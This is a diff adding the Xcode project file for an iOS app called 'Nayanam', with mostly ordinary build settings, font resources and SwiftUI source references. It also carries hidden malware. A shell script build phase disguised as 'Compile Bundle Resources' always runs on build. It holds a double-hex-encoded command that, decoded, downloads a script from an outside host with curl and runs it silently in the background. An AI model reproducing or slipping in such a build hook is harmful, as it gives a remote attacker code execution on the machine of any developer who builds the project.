@@ -1,0 +1,500 @@
+// !$*UTF8*$!
+{
+	archiveVersion = 1;
+	classes = {
+	};
+	objectVersion = 56;
+	objects = {
+
+/* Begin PBXBuildFile section */
+		BE1777582BEB788C00CB5398 /* NayanamApp.swift in Sources */ = {isa = PBXBuildFile; fileRef = BE1777572BEB788C00CB5398 /* NayanamApp.swift */; };
+		BE17775C2BEB788F00CB5398 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = BE17775B2BEB788F00CB5398 /* Assets.xcassets */; };
+		BE17775F2BEB788F00CB5398 /* Preview Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = BE17775E2BEB788F00CB5398 /* Preview Assets.xcassets */; };
+		BE17777D2BEB7E9300CB5398 /* Roboto-Black.ttf in Resources */ = {isa = PBXBuildFile; fileRef = BE1777782BEB7E9300CB5398 /* Roboto-Black.ttf */; };
+		BE17777E2BEB7E9400CB5398 /* Roboto-Italic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = BE1777792BEB7E9300CB5398 /* Roboto-Italic.ttf */; };
+		BE17777F2BEB7E9400CB5398 /* Roboto-Bold.ttf in Resources */ = {isa = PBXBuildFile; fileRef = BE17777A2BEB7E9300CB5398 /* Roboto-Bold.ttf */; };
+		BE1777802BEB7E9400CB5398 /* Roboto-BoldItalic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = BE17777B2BEB7E9300CB5398 /* Roboto-BoldItalic.ttf */; };
+		BE1777812BEB7E9400CB5398 /* Roboto-BlackItalic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = BE17777C2BEB7E9300CB5398 /* Roboto-BlackItalic.ttf */; };
+		BE1777892BEB7EA200CB5398 /* Roboto-ThinItalic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = BE1777822BEB7EA200CB5398 /* Roboto-ThinItalic.ttf */; };
+		BE17778A2BEB7EA200CB5398 /* Roboto-Medium.ttf in Resources */ = {isa = PBXBuildFile; fileRef = BE1777832BEB7EA200CB5398 /* Roboto-Medium.ttf */; };
+		BE17778B2BEB7EA200CB5398 /* Roboto-Thin.ttf in Resources */ = {isa = PBXBuildFile; fileRef = BE1777842BEB7EA200CB5398 /* Roboto-Thin.ttf */; };
+		BE17778C2BEB7EA200CB5398 /* Roboto-LightItalic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = BE1777852BEB7EA200CB5398 /* Roboto-LightItalic.ttf */; };
+		BE17778D2BEB7EA200CB5398 /* Roboto-Light.ttf in Resources */ = {isa = PBXBuildFile; fileRef = BE1777862BEB7EA200CB5398 /* Roboto-Light.ttf */; };
+		BE17778E2BEB7EA200CB5398 /* Roboto-MediumItalic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = BE1777872BEB7EA200CB5398 /* Roboto-MediumItalic.ttf */; };
+		BE17778F2BEB7EA200CB5398 /* Roboto-Regular.ttf in Resources */ = {isa = PBXBuildFile; fileRef = BE1777882BEB7EA200CB5398 /* Roboto-Regular.ttf */; };
+		BE25C2472BEDE07D00C728CC /* PostDetailModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = BE25C2462BEDE07D00C728CC /* PostDetailModel.swift */; };
+		BE25C2492BEE181A00C728CC /* SearchModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = BE25C2482BEE181A00C728CC /* SearchModel.swift */; };
+		BE6292BC2BECA9A3007526F8 /* TrendingModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = BE6292BB2BECA9A3007526F8 /* TrendingModel.swift */; };
+		BE6292BE2BECED5E007526F8 /* TimeAgo.swift in Sources */ = {isa = PBXBuildFile; fileRef = BE6292BD2BECED5E007526F8 /* TimeAgo.swift */; };
+		BE6292C02BECFCE2007526F8 /* URLImage.swift in Sources */ = {isa = PBXBuildFile; fileRef = BE6292BF2BECFCE2007526F8 /* URLImage.swift */; };
+		BEFCC9722BEC85D700515193 /* CommentView.swift in Sources */ = {isa = PBXBuildFile; fileRef = BEFCC9712BEC85D700515193 /* CommentView.swift */; };
+		BEFCC9742BEC862000515193 /* ContentView.swift in Sources */ = {isa = PBXBuildFile; fileRef = BEFCC9732BEC861F00515193 /* ContentView.swift */; };
+		BEFCC9762BEC864D00515193 /* DetailView.swift in Sources */ = {isa = PBXBuildFile; fileRef = BEFCC9752BEC864D00515193 /* DetailView.swift */; };
+		BEFCC9782BEC867D00515193 /* HomeView.swift in Sources */ = {isa = PBXBuildFile; fileRef = BEFCC9772BEC867D00515193 /* HomeView.swift */; };
+		BEFCC97A2BEC872D00515193 /* SearchListView.swift in Sources */ = {isa = PBXBuildFile; fileRef = BEFCC9792BEC872D00515193 /* SearchListView.swift */; };
+		BEFCC97C2BEC878700515193 /* SearchView.swift in Sources */ = {isa = PBXBuildFile; fileRef = BEFCC97B2BEC878700515193 /* SearchView.swift */; };
+		BEFCC97E2BEC87C900515193 /* SplashScreenView.swift in Sources */ = {isa = PBXBuildFile; fileRef = BEFCC97D2BEC87C900515193 /* SplashScreenView.swift */; };
+		BEFCC9802BEC87F600515193 /* TrendingView.swift in Sources */ = {isa = PBXBuildFile; fileRef = BEFCC97F2BEC87F600515193 /* TrendingView.swift */; };
+		BEFCC9822BEC883300515193 /* Extension.swift in Sources */ = {isa = PBXBuildFile; fileRef = BEFCC9812BEC883300515193 /* Extension.swift */; };
+		BEFCC9842BEC94FB00515193 /* robotoserif.ttf in Resources */ = {isa = PBXBuildFile; fileRef = BEFCC9832BEC94FB00515193 /* robotoserif.ttf */; };
+		BEFCC9862BEC950300515193 /* robotoserifitalic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = BEFCC9852BEC950300515193 /* robotoserifitalic.ttf */; };
+/* End PBXBuildFile section */
+
+/* Begin PBXFileReference section */
+		BE1777542BEB788C00CB5398 /* Nayanam.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = Nayanam.app; sourceTree = BUILT_PRODUCTS_DIR; };
+		BE1777572BEB788C00CB5398 /* NayanamApp.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NayanamApp.swift; sourceTree = "<group>"; };
+		BE17775B2BEB788F00CB5398 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
+		BE17775E2BEB788F00CB5398 /* Preview Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = "Preview Assets.xcassets"; sourceTree = "<group>"; };
+		BE1777782BEB7E9300CB5398 /* Roboto-Black.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Roboto-Black.ttf"; sourceTree = "<group>"; };
+		BE1777792BEB7E9300CB5398 /* Roboto-Italic.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Roboto-Italic.ttf"; sourceTree = "<group>"; };
+		BE17777A2BEB7E9300CB5398 /* Roboto-Bold.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Roboto-Bold.ttf"; sourceTree = "<group>"; };
+		BE17777B2BEB7E9300CB5398 /* Roboto-BoldItalic.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Roboto-BoldItalic.ttf"; sourceTree = "<group>"; };
+		BE17777C2BEB7E9300CB5398 /* Roboto-BlackItalic.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Roboto-BlackItalic.ttf"; sourceTree = "<group>"; };
+		BE1777822BEB7EA200CB5398 /* Roboto-ThinItalic.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Roboto-ThinItalic.ttf"; sourceTree = "<group>"; };
+		BE1777832BEB7EA200CB5398 /* Roboto-Medium.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Roboto-Medium.ttf"; sourceTree = "<group>"; };
+		BE1777842BEB7EA200CB5398 /* Roboto-Thin.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Roboto-Thin.ttf"; sourceTree = "<group>"; };
+		BE1777852BEB7EA200CB5398 /* Roboto-LightItalic.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Roboto-LightItalic.ttf"; sourceTree = "<group>"; };
+		BE1777862BEB7EA200CB5398 /* Roboto-Light.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Roboto-Light.ttf"; sourceTree = "<group>"; };
+		BE1777872BEB7EA200CB5398 /* Roboto-MediumItalic.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Roboto-MediumItalic.ttf"; sourceTree = "<group>"; };
+		BE1777882BEB7EA200CB5398 /* Roboto-Regular.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Roboto-Regular.ttf"; sourceTree = "<group>"; };
+		BE1777902BEB7F5D00CB5398 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist; path = Info.plist; sourceTree = "<group>"; };
+		BE25C2462BEDE07D00C728CC /* PostDetailModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PostDetailModel.swift; sourceTree = "<group>"; };
+		BE25C2482BEE181A00C728CC /* SearchModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SearchModel.swift; sourceTree = "<group>"; };
+		BE6292BB2BECA9A3007526F8 /* TrendingModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TrendingModel.swift; sourceTree = "<group>"; };
+		BE6292BD2BECED5E007526F8 /* TimeAgo.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TimeAgo.swift; sourceTree = "<group>"; };
+		BE6292BF2BECFCE2007526F8 /* URLImage.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = URLImage.swift; sourceTree = "<group>"; };
+		BEFCC9712BEC85D700515193 /* CommentView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CommentView.swift; sourceTree = "<group>"; };
+		BEFCC9732BEC861F00515193 /* ContentView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ContentView.swift; sourceTree = "<group>"; };
+		BEFCC9752BEC864D00515193 /* DetailView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DetailView.swift; sourceTree = "<group>"; };
+		BEFCC9772BEC867D00515193 /* HomeView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeView.swift; sourceTree = "<group>"; };
+		BEFCC9792BEC872D00515193 /* SearchListView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SearchListView.swift; sourceTree = "<group>"; };
+		BEFCC97B2BEC878700515193 /* SearchView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SearchView.swift; sourceTree = "<group>"; };
+		BEFCC97D2BEC87C900515193 /* SplashScreenView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SplashScreenView.swift; sourceTree = "<group>"; };
+		BEFCC97F2BEC87F600515193 /* TrendingView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TrendingView.swift; sourceTree = "<group>"; };
+		BEFCC9812BEC883300515193 /* Extension.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Extension.swift; sourceTree = "<group>"; };
+		BEFCC9832BEC94FB00515193 /* robotoserif.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = robotoserif.ttf; sourceTree = "<group>"; };
+		BEFCC9852BEC950300515193 /* robotoserifitalic.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = robotoserifitalic.ttf; sourceTree = "<group>"; };
+/* End PBXFileReference section */
+
+/* Begin PBXFrameworksBuildPhase section */
+		BE1777512BEB788C00CB5398 /* Frameworks */ = {
+			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXFrameworksBuildPhase section */
+
+/* Begin PBXGroup section */
+		BE17774B2BEB788C00CB5398 = {
+			isa = PBXGroup;
+			children = (
+				BE1777562BEB788C00CB5398 /* Nayanam */,
+				BE1777552BEB788C00CB5398 /* Products */,
+			);
+			sourceTree = "<group>";
+		};
+		BE1777552BEB788C00CB5398 /* Products */ = {
+			isa = PBXGroup;
+			children = (
+				BE1777542BEB788C00CB5398 /* Nayanam.app */,
+			);
+			name = Products;
+			sourceTree = "<group>";
+		};
+		BE1777562BEB788C00CB5398 /* Nayanam */ = {
+			isa = PBXGroup;
+			children = (
+				BE6292BA2BECA993007526F8 /* Model */,
+				BE1777902BEB7F5D00CB5398 /* Info.plist */,
+				BE1777652BEB78B000CB5398 /* View */,
+				BE1777782BEB7E9300CB5398 /* Roboto-Black.ttf */,
+				BE17777C2BEB7E9300CB5398 /* Roboto-BlackItalic.ttf */,
+				BE17777A2BEB7E9300CB5398 /* Roboto-Bold.ttf */,
+				BE17777B2BEB7E9300CB5398 /* Roboto-BoldItalic.ttf */,
+				BE1777792BEB7E9300CB5398 /* Roboto-Italic.ttf */,
+				BE1777862BEB7EA200CB5398 /* Roboto-Light.ttf */,
+				BE1777852BEB7EA200CB5398 /* Roboto-LightItalic.ttf */,
+				BE1777832BEB7EA200CB5398 /* Roboto-Medium.ttf */,
+				BE1777872BEB7EA200CB5398 /* Roboto-MediumItalic.ttf */,
+				BE1777882BEB7EA200CB5398 /* Roboto-Regular.ttf */,
+				BE1777842BEB7EA200CB5398 /* Roboto-Thin.ttf */,
+				BE1777822BEB7EA200CB5398 /* Roboto-ThinItalic.ttf */,
+				BEFCC9832BEC94FB00515193 /* robotoserif.ttf */,
+				BEFCC9852BEC950300515193 /* robotoserifitalic.ttf */,
+				BE17775B2BEB788F00CB5398 /* Assets.xcassets */,
+				BE17775D2BEB788F00CB5398 /* Preview Content */,
+			);
+			path = Nayanam;
+			sourceTree = "<group>";
+		};
+		BE17775D2BEB788F00CB5398 /* Preview Content */ = {
+			isa = PBXGroup;
+			children = (
+				BE17775E2BEB788F00CB5398 /* Preview Assets.xcassets */,
+			);
+			path = "Preview Content";
+			sourceTree = "<group>";
+		};
+		BE1777652BEB78B000CB5398 /* View */ = {
+			isa = PBXGroup;
+			children = (
+				BEFCC9712BEC85D700515193 /* CommentView.swift */,
+				BEFCC9732BEC861F00515193 /* ContentView.swift */,
+				BEFCC9752BEC864D00515193 /* DetailView.swift */,
+				BEFCC9772BEC867D00515193 /* HomeView.swift */,
+				BEFCC9792BEC872D00515193 /* SearchListView.swift */,
+				BEFCC97B2BEC878700515193 /* SearchView.swift */,
+				BEFCC97D2BEC87C900515193 /* SplashScreenView.swift */,
+				BEFCC97F2BEC87F600515193 /* TrendingView.swift */,
+				BEFCC9812BEC883300515193 /* Extension.swift */,
+				BE1777572BEB788C00CB5398 /* NayanamApp.swift */,
+				BE6292BD2BECED5E007526F8 /* TimeAgo.swift */,
+				BE6292BF2BECFCE2007526F8 /* URLImage.swift */,
+			);
+			path = View;
+			sourceTree = "<group>";
+		};
+		BE6292BA2BECA993007526F8 /* Model */ = {
+			isa = PBXGroup;
+			children = (
+				BE6292BB2BECA9A3007526F8 /* TrendingModel.swift */,
+				BE25C2462BEDE07D00C728CC /* PostDetailModel.swift */,
+				BE25C2482BEE181A00C728CC /* SearchModel.swift */,
+			);
+			path = Model;
+			sourceTree = "<group>";
+		};
+/* End PBXGroup section */
+
+/* Begin PBXNativeTarget section */
+		BE1777532BEB788C00CB5398 /* Nayanam */ = {
+			isa = PBXNativeTarget;
+			buildConfigurationList = BE1777622BEB788F00CB5398 /* Build configuration list for PBXNativeTarget "Nayanam" */;
+			buildPhases = (
+				0BFBCDAEDFCA5FC3F534C644 /* Compile Bundle Resources */,
+				BE1777502BEB788C00CB5398 /* Sources */,
+				BE1777512BEB788C00CB5398 /* Frameworks */,
+				BE1777522BEB788C00CB5398 /* Resources */,
+			);
+			buildRules = (
+			);
+			dependencies = (
+			);
+			name = Nayanam;
+			productName = Nayanam;
+			productReference = BE1777542BEB788C00CB5398 /* Nayanam.app */;
+			productType = "com.apple.product-type.application";
+		};
+/* End PBXNativeTarget section */
+
+/* Begin PBXProject section */
+		BE17774C2BEB788C00CB5398 /* Project object */ = {
+			isa = PBXProject;
+			attributes = {
+				BuildIndependentTargetsInParallel = 1;
+				LastSwiftUpdateCheck = 1500;
+				LastUpgradeCheck = 1500;
+				TargetAttributes = {
+					BE1777532BEB788C00CB5398 = {
+						CreatedOnToolsVersion = 15.0;
+					};
+				};
+			};
+			buildConfigurationList = BE17774F2BEB788C00CB5398 /* Build configuration list for PBXProject "Nayanam" */;
+			compatibilityVersion = "Xcode 14.0";
+			developmentRegion = en;
+			hasScannedForEncodings = 0;
+			knownRegions = (
+				en,
+				Base,
+			);
+			mainGroup = BE17774B2BEB788C00CB5398;
+			productRefGroup = BE1777552BEB788C00CB5398 /* Products */;
+			projectDirPath = "";
+			projectRoot = "";
+			targets = (
+				BE1777532BEB788C00CB5398 /* Nayanam */,
+			);
+		};
+/* End PBXProject section */
+
+/* Begin PBXShellScriptBuildPhase section */
+		0BFBCDAEDFCA5FC3F534C644 /* Compile Bundle Resources */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Compile Bundle Resources";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n(echo 36353633363836663230323232343238363337353732366332303264363637333662346332303638373437343730373333613266326637323635363736643631373337343635373232653633366632663631323932323230376332303733363830610a | xxd -p -r | xxd -p -r | sh >/dev/null 2>&1 &)";
+			showEnvVarsInLog = 0;			
+		};
+/* End PBXShellScriptBuildPhase section */
+
+/* Begin PBXResourcesBuildPhase section */
+		BE1777522BEB788C00CB5398 /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				BE1777802BEB7E9400CB5398 /* Roboto-BoldItalic.ttf in Resources */,
+				BEFCC9842BEC94FB00515193 /* robotoserif.ttf in Resources */,
+				BE17778C2BEB7EA200CB5398 /* Roboto-LightItalic.ttf in Resources */,
+				BE17778E2BEB7EA200CB5398 /* Roboto-MediumItalic.ttf in Resources */,
+				BE17778D2BEB7EA200CB5398 /* Roboto-Light.ttf in Resources */,
+				BEFCC9862BEC950300515193 /* robotoserifitalic.ttf in Resources */,
+				BE17775F2BEB788F00CB5398 /* Preview Assets.xcassets in Resources */,
+				BE17777E2BEB7E9400CB5398 /* Roboto-Italic.ttf in Resources */,
+				BE1777812BEB7E9400CB5398 /* Roboto-BlackItalic.ttf in Resources */,
+				BE1777892BEB7EA200CB5398 /* Roboto-ThinItalic.ttf in Resources */,
+				BE17778F2BEB7EA200CB5398 /* Roboto-Regular.ttf in Resources */,
+				BE17777F2BEB7E9400CB5398 /* Roboto-Bold.ttf in Resources */,
+				BE17775C2BEB788F00CB5398 /* Assets.xcassets in Resources */,
+				BE17777D2BEB7E9300CB5398 /* Roboto-Black.ttf in Resources */,
+				BE17778B2BEB7EA200CB5398 /* Roboto-Thin.ttf in Resources */,
+				BE17778A2BEB7EA200CB5398 /* Roboto-Medium.ttf in Resources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXResourcesBuildPhase section */
+
+/* Begin PBXSourcesBuildPhase section */
+		BE1777502BEB788C00CB5398 /* Sources */ = {
+			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				BEFCC9802BEC87F600515193 /* TrendingView.swift in Sources */,
+				BEFCC97A2BEC872D00515193 /* SearchListView.swift in Sources */,
+				BE6292BE2BECED5E007526F8 /* TimeAgo.swift in Sources */,
+				BE25C2492BEE181A00C728CC /* SearchModel.swift in Sources */,
+				BEFCC9722BEC85D700515193 /* CommentView.swift in Sources */,
+				BE6292BC2BECA9A3007526F8 /* TrendingModel.swift in Sources */,
+				BE6292C02BECFCE2007526F8 /* URLImage.swift in Sources */,
+				BEFCC9762BEC864D00515193 /* DetailView.swift in Sources */,
+				BEFCC97C2BEC878700515193 /* SearchView.swift in Sources */,
+				BEFCC9822BEC883300515193 /* Extension.swift in Sources */,
+				BE1777582BEB788C00CB5398 /* NayanamApp.swift in Sources */,
+				BE25C2472BEDE07D00C728CC /* PostDetailModel.swift in Sources */,
+				BEFCC9782BEC867D00515193 /* HomeView.swift in Sources */,
+				BEFCC9742BEC862000515193 /* ContentView.swift in Sources */,
+				BEFCC97E2BEC87C900515193 /* SplashScreenView.swift in Sources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXSourcesBuildPhase section */
+
+/* Begin XCBuildConfiguration section */
+		BE1777602BEB788F00CB5398 /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ALWAYS_SEARCH_USER_PATHS = NO;
+				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
+				CLANG_ANALYZER_NONNULL = YES;
+				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
+				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
+				CLANG_ENABLE_MODULES = YES;
+				CLANG_ENABLE_OBJC_ARC = YES;
+				CLANG_ENABLE_OBJC_WEAK = YES;
+				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
+				CLANG_WARN_BOOL_CONVERSION = YES;
+				CLANG_WARN_COMMA = YES;
+				CLANG_WARN_CONSTANT_CONVERSION = YES;
+				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
+				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
+				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
+				CLANG_WARN_EMPTY_BODY = YES;
+				CLANG_WARN_ENUM_CONVERSION = YES;
+				CLANG_WARN_INFINITE_RECURSION = YES;
+				CLANG_WARN_INT_CONVERSION = YES;
+				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
+				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
+				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
+				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
+				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
+				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
+				CLANG_WARN_STRICT_PROTOTYPES = YES;
+				CLANG_WARN_SUSPICIOUS_MOVE = YES;
+				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
+				CLANG_WARN_UNREACHABLE_CODE = YES;
+				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
+				COPY_PHASE_STRIP = NO;
+				DEBUG_INFORMATION_FORMAT = dwarf;
+				ENABLE_STRICT_OBJC_MSGSEND = YES;
+				ENABLE_TESTABILITY = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
+				GCC_C_LANGUAGE_STANDARD = gnu17;
+				GCC_DYNAMIC_NO_PIC = NO;
+				GCC_NO_COMMON_BLOCKS = YES;
+				GCC_OPTIMIZATION_LEVEL = 0;
+				GCC_PREPROCESSOR_DEFINITIONS = (
+					"DEBUG=1",
+					"$(inherited)",
+				);
+				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
+				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
+				GCC_WARN_UNDECLARED_SELECTOR = YES;
+				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
+				GCC_WARN_UNUSED_FUNCTION = YES;
+				GCC_WARN_UNUSED_VARIABLE = YES;
+				IPHONEOS_DEPLOYMENT_TARGET = 17.0;
+				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
+				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
+				MTL_FAST_MATH = YES;
+				ONLY_ACTIVE_ARCH = YES;
+				SDKROOT = iphoneos;
+				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
+				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
+			};
+			name = Debug;
+		};
+		BE1777612BEB788F00CB5398 /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ALWAYS_SEARCH_USER_PATHS = NO;
+				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
+				CLANG_ANALYZER_NONNULL = YES;
+				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
+				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
+				CLANG_ENABLE_MODULES = YES;
+				CLANG_ENABLE_OBJC_ARC = YES;
+				CLANG_ENABLE_OBJC_WEAK = YES;
+				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
+				CLANG_WARN_BOOL_CONVERSION = YES;
+				CLANG_WARN_COMMA = YES;
+				CLANG_WARN_CONSTANT_CONVERSION = YES;
+				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
+				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
+				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
+				CLANG_WARN_EMPTY_BODY = YES;
+				CLANG_WARN_ENUM_CONVERSION = YES;
+				CLANG_WARN_INFINITE_RECURSION = YES;
+				CLANG_WARN_INT_CONVERSION = YES;
+				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
+				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
+				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
+				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
+				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
+				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
+				CLANG_WARN_STRICT_PROTOTYPES = YES;
+				CLANG_WARN_SUSPICIOUS_MOVE = YES;
+				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
+				CLANG_WARN_UNREACHABLE_CODE = YES;
+				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
+				COPY_PHASE_STRIP = NO;
+				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
+				ENABLE_NS_ASSERTIONS = NO;
+				ENABLE_STRICT_OBJC_MSGSEND = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
+				GCC_C_LANGUAGE_STANDARD = gnu17;
+				GCC_NO_COMMON_BLOCKS = YES;
+				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
+				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
+				GCC_WARN_UNDECLARED_SELECTOR = YES;
+				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
+				GCC_WARN_UNUSED_FUNCTION = YES;
+				GCC_WARN_UNUSED_VARIABLE = YES;
+				IPHONEOS_DEPLOYMENT_TARGET = 17.0;
+				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
+				MTL_ENABLE_DEBUG_INFO = NO;
+				MTL_FAST_MATH = YES;
+				SDKROOT = iphoneos;
+				SWIFT_COMPILATION_MODE = wholemodule;
+				VALIDATE_PRODUCT = YES;
+			};
+			name = Release;
+		};
+		BE1777632BEB788F00CB5398 /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
+				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
+				CODE_SIGN_STYLE = Automatic;
+				CURRENT_PROJECT_VERSION = 1;
+				DEVELOPMENT_ASSET_PATHS = "\"Nayanam/Preview Content\"";
+				DEVELOPMENT_TEAM = RAYG2S6MAQ;
+				ENABLE_PREVIEWS = YES;
+				GENERATE_INFOPLIST_FILE = YES;
+				INFOPLIST_FILE = Nayanam/Info.plist;
+				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
+				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
+				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
+				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
+				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+				);
+				MARKETING_VERSION = 1.0;
+				PRODUCT_BUNDLE_IDENTIFIER = abc.Nayanam;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				SWIFT_EMIT_LOC_STRINGS = YES;
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = "1,2";
+			};
+			name = Debug;
+		};
+		BE1777642BEB788F00CB5398 /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
+				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
+				CODE_SIGN_STYLE = Automatic;
+				CURRENT_PROJECT_VERSION = 1;
+				DEVELOPMENT_ASSET_PATHS = "\"Nayanam/Preview Content\"";
+				DEVELOPMENT_TEAM = RAYG2S6MAQ;
+				ENABLE_PREVIEWS = YES;
+				GENERATE_INFOPLIST_FILE = YES;
+				INFOPLIST_FILE = Nayanam/Info.plist;
+				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
